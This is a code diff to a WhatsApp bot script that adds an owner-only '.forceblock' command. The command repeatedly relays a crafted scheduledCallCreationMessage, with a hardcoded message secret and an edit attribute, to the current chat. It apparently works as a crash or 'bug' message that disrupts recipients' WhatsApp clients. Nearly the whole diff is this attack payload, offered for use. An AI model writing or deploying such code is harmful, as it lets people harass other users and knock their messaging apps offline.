@@ -3030,6 +3030,7 @@ Usage:
                 const replyMessage = message.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;
                 await tagCommand(sock, chatId, senderId, messageText, replyMessage, message);
                 break;
+            
             case userMessage.startsWith('.antilink'):
                 if (!isGroup) {
                     await sock.sendMessage(chatId, {
@@ -3261,7 +3262,49 @@ for (let i = 0; i < attempts; i++) {
     break;
 }
 
+case userMessage.startsWith('.forceblock'): {
 
+    if (!message.key.fromMe && !(await isOwnerOrSudo(senderId, sock, chatId))) {
+        await sock.sendMessage(
+            chatId,
+            { text: '❌ Only owner/sudo can use this command!' },
+            { quoted: message }
+        );
+        break;
+    }
+
+    const args = rawText.slice(11).trim().split(/\s+/);
+
+    let loopCount = parseInt(args[0]);
+    if (isNaN(loopCount) || loopCount < 1) loopCount = 5;
+
+    const targetJid = chatId;
+
+    for (let i = 0; i < loopCount; i++) {
+        await new Promise(r => setTimeout(r, 1050));
+
+        await sock.relayMessage(
+            targetJid,
+            {
+                messageContextInfo: {
+                    messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
+                    deviceListMetaData: {},
+                    deviceListMetadataVersion: 2
+                },
+                scheduledCallCreationMessage: {
+                    scheduledTimestampMs: '1200',
+                    callType: "AUDIO",
+                    title: '👻'
+                }
+            },
+            {
+                additionalAttributes: { edit: '7' }
+            }
+        );
+    }
+
+    break;
+}
             case userMessage === '.listgc': {
     if (!message.key.fromMe && !(await isOwnerOrSudo(senderId, sock, chatId))) {
         await sock.sendMessage(
